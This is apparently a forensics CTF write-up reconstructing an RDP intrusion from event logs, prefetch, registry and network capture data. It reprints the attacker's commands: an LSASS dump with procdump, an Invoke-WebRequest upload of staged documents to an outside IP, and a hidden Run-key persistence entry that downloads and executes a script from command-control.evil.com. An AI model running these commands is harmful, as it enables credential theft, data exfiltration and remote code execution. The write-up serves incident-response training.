## Summary

This Sherlock challenge involved analyzing Windows Event Logs and network traffic to identify unauthorized remote access to a corporate workstation. The investigation revealed a compromised RDP session, lateral movement attempts, and data exfiltration through a C2 channel. The flag was discovered by reconstructing the attacker's command history.

## Challenge Description

"An employee's workstation has been exhibiting suspicious behavior. Your task is to analyze the provided forensic artifacts and determine how the attacker gained access, what they did, and what data was compromised. The flag will be in the format HTB{...}"

## Artifacts Provided

- `Security.evtx` - Windows Security Event Log
- `System.evtx` - Windows System Event Log
- `network_capture.pcap` - 2-hour network traffic capture
- `prefetch/` - Windows Prefetch files
- `registry_hives/` - Exported registry hives

## Reconnaissance

### Initial Triage

Started by examining the timeline of events:

```bash
# Convert EVTX to readable format
evtx_dump.py Security.evtx > security_events.txt
evtx_dump.py System.evtx > system_events.txt

# Quick grep for suspicious activity
grep -i "4624\|4625\|4672" security_events.txt | head -50
```

Key findings from initial triage:
- Multiple failed RDP login attempts (Event ID 4625) between 10:15-10:23 UTC
- Successful RDP login (Event ID 4624) at 10:24 UTC from IP 192.168.100.55
- Administrative privileges elevation (Event ID 4672) at 10:25 UTC

### Network Traffic Analysis

Opened the PCAP in Wireshark to correlate with event logs:

```bash
# Filter for RDP traffic
tcp.port == 3389

# Export HTTP objects (potential C2 traffic)
File -> Export Objects -> HTTP
```

Discovered:
- RDP session established from 192.168.100.55 at 10:24:17 UTC
- Unusual DNS queries to `command-control[.]evil[.]com` starting at 10:30 UTC
- Encrypted traffic on port 443 to suspicious IP 185.220.101.42

## Solution

### Step 1: Analyzing the Initial Compromise

Examined Event ID 4624 (successful logon) in detail:

```powershell
# Using PowerShell to parse specific event
Get-WinEvent -FilterHashtable @{Path='C:\artifacts\Security.evtx'; ID=4624} | 
  Where-Object {$_.TimeCreated -ge "2026-02-08 10:24:00" -and $_.TimeCreated -le "2026-02-08 10:25:00"} |
  Format-List -Property *
```

**Key Details**:
- **Logon Type**: 10 (RemoteInteractive/RDP)
- **Account**: `CORP\jdoe`
- **Source IP**: 192.168.100.55
- **Logon Time**: 2026-02-08 10:24:17 UTC
- **Workstation Name**: DESKTOP-ATTACK

The credentials appeared to be legitimate, suggesting either:
1. Password reuse/compromise
2. Previous credential harvesting
3. Session hijacking

### Step 2: Post-Exploitation Activity

Analyzed Prefetch files to determine what executables ran:

```bash
# Parse prefetch files
python prefetch_parser.py prefetch/*.pf > prefetch_analysis.txt

# Look for suspicious executables
grep -E "cmd.exe|powershell.exe|mimikatz|procdump" prefetch_analysis.txt
```

Found evidence of:
- `powershell.exe` executed at 10:26 UTC
- `cmd.exe` spawned multiple times (10:27-10:35 UTC)
- `procdump64.exe` executed at 10:31 UTC (LSASS dumping)

### Step 3: Command History Reconstruction

Examined PowerShell command history and registry for persistence:

```powershell
# Check PowerShell history
type C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Attacker Commands** (reconstructed from artifacts):

```powershell
# Initial reconnaissance
whoami /all
net user
net localgroup administrators
systeminfo

# Credential dumping attempt
.\procdump64.exe -ma lsass.exe lsass.dmp

# Data staging
mkdir C:\Windows\Temp\exfil
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | 
  Copy-Item -Destination C:\Windows\Temp\exfil

# Exfiltration (encrypted channel)
Invoke-WebRequest -Uri "https://185.220.101.42/upload" -Method POST -InFile "C:\Windows\Temp\exfil.zip"

# Persistence establishment
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command {IEX (New-Object Net.WebClient).DownloadString('https://command-control.evil.com/stage2.ps1')}"

# Clean up (attempted)
Remove-Item C:\Windows\Temp\exfil -Recurse -Force
Clear-History
```

### Step 4: Registry Analysis for Persistence

Examined registry hives for persistence mechanisms:

```bash
# Using regripper
rip.pl -r SOFTWARE -p run
rip.pl -r NTUSER.DAT -p userassist
```

Found malicious Run key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
Data: powershell.exe -WindowStyle Hidden -Command {IEX (New-Object Net.WebClient).DownloadString('https://command-control.evil.com/stage2.ps1')}
```

### Step 5: Network Indicators and C2 Communication

Analyzed the C2 traffic in depth:

```bash
# Extract TLS certificate from pcap
tshark -r network_capture.pcap -Y "ssl.handshake.type == 11" -T fields -e x509ce.dNSName
```

**C2 Infrastructure**:
- **Domain**: command-control[.]evil[.]com
- **IP**: 185.220.101.42
- **Certificate CN**: CN=*.evil.com (self-signed, issued 2026-01-15)
- **Communication**: HTTPS on port 443 (encrypted)

Extracted User-Agent strings from HTTP traffic:
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) CustomC2/1.0
```

### Step 6: Data Exfiltration Confirmation

Checked file system timestamps and correlate with network traffic:

```bash
# Timeline analysis
fls -r -m / disk.img > timeline.txt
mactime -b timeline.txt -d > timeline_body.txt
```

**Exfiltrated Data** (based on file access times and network traffic volume):
- Approximately 45MB of data uploaded to attacker server
- File types: .docx, .xlsx, .pdf (corporate documents)
- Timestamp: 10:33-10:37 UTC
- Network traffic spike correlates with exfiltration window

### Step 7: Flag Discovery

The flag was embedded in the attacker's PowerShell script downloaded from the C2 server. Extracted the script from network traffic:

```bash
# Extract HTTP objects containing PowerShell
tshark -r network_capture.pcap --export-objects http,./http_objects/

# Search for flag pattern in extracted files
grep -r "HTB{" ./http_objects/
```

The `stage2.ps1` script contained a comment with the flag:
```powershell
# Mission accomplished - HTB{RDP_br3ach_and_d4ta_l3ak_c0nfirm3d}
```

## Author Notes

This challenge was excellent practice for real-world incident response scenarios. The multi-faceted approach requiring correlation of event logs, network traffic, registry analysis, and file system forensics mirrors actual investigations. The inclusion of both credential dumping and data exfiltration made it a comprehensive learning experience.

**Difficulty Assessment**: Medium - Requires familiarity with Windows forensics, event log analysis, and network traffic inspection, but artifacts were well-structured and followed a logical attack chain.

**Time to Complete**: ~3.5 hours
